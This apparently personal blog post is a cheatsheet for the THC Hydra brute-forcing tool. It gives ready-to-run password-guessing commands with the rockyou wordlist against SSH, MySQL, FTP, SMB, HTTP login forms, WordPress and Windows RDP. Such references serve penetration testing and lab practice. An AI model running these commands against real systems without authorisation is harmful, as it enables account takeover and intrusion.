---
layout: post
title: THC Hydra Cheatsheet
summary: A cheatsheet for the THC Hydra bruteforcing tool. THC Hydra is a tool developed by van Hauser / THC for bruteforcing credentials on multiple protocols.
date: 2020-07-24
author: Noxtal
categories: cheatsheets
thumbnail:  hydra
tags:
 - cheatsheet
 - hydra
 - bruteforce
 - attack
---

A cheatsheet for the THC Hydra bruteforcing tool. THC Hydra is a tool developed by van Hauser / THC for bruteforcing credentials on multiple protocols.

-----

- [Cheatsheet](#cheatsheet)
  - [Basic Usage](#basic-usage)
    - [Syntax](#syntax)
    - [Useful flags](#useful-flags)
  - [SSH](#ssh)
  - [MySQL](#mysql)
  - [FTP](#ftp)
  - [SMB](#smb)
  - [HTTP Post Form](#http-post-form)
  - [Wordpress](#wordpress)
  - [Windows RDP](#windows-rdp)

# Cheatsheet
## Basic Usage
### Syntax 

`hydra [OPTIONS] IP`

### Useful flags
- `-h`: see the help menu
- `-l <LOGIN>`: Pass single username/login
- `-L <FILE>`: Pass multiple usernames/logins 
- `-p <LOGIN>`: Pass single known password
- `-P <FILE>`: Pass a password list or wordlist (ex.: `rockyou.txt`)
- `-s <PORT>`: Use custom port
- `-f`: Exit as soon as at least one a login and a password combination is found
- `-R`: Restore previous session (if crashed/aborted)

## SSH
Bruteforce SSH credentials 
```bash
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
```
(use `-s` for custom port)

## MySQL
Bruteforce MySQL credentials
```bash
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
```
(use `-s` for custom port)

## FTP
Bruteforce FTP credentials 
```bash
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP ftp
```
(use `-s` for custom port)

## SMB
Bruteforce SMB credentials 
```bash
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb
```
(use `-s` for custom port)

## HTTP Post Form
Bruteforce web HTTP form 
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
```
(use `-s` for custom port)

Ex.:
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
```

## Wordpress
Bruteforce WordPress credentials 
```bash
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
(use `-s` for custom port)

## Windows RDP
Bruteforce Windows Remote Desktop credentials
```bash
hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
```